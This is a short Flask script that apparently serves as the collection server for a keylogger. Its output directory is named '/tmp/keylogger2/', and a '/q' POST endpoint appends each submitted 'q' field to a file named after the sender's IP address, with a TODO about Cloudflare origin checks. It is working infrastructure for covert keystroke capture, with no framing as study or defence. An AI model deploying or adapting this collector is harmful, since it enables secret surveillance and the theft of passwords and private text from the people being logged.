from flask import Flask, request
import os
import ipaddress

app = Flask(__name__)

dst="/tmp/keylogger2/"

@app.route('/')
def index():
    return 'Hello world'


@app.route('/q', methods=['POST'])
def hello_world():
    src = request.headers.get("X-Forwarded-For")

    # validate address
    # TODO: check cloudflare origin
    ipaddress.ip_address(src)

    with open(os.path.join(dst, src), "a") as f:
        f.write(request.form['q'])

    return 'OK'
